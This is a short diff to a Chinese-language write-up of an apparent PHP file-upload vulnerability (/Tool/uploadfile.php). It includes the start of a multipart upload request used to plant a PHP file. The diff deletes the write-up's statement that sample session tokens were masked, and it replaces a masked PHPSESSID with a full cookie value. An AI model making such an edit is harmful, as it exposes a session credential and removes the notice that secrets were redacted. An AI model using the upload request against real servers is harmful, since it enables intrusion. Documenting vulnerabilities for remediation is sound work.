@@ -36,7 +36,6 @@ source_status: "recorded"
 - /home/helloworld.php究竟磁盘或URL路径未区分，上传成功不等于PHP执行
 - 缺响应/修复以及登录前提说明
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -65,7 +64,7 @@ source_status: "recorded"
 ```http
 POST /Tool/uploadfile.php? HTTP/1.1
 Host: 
-Cookie: PHPSESSID=942**************************383
+Cookie: PHPSESSID=942c6029711a902ca974ac33efcdb383
 Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
 Content-Length: 409
 Upgrade-Insecure-Requests: 1
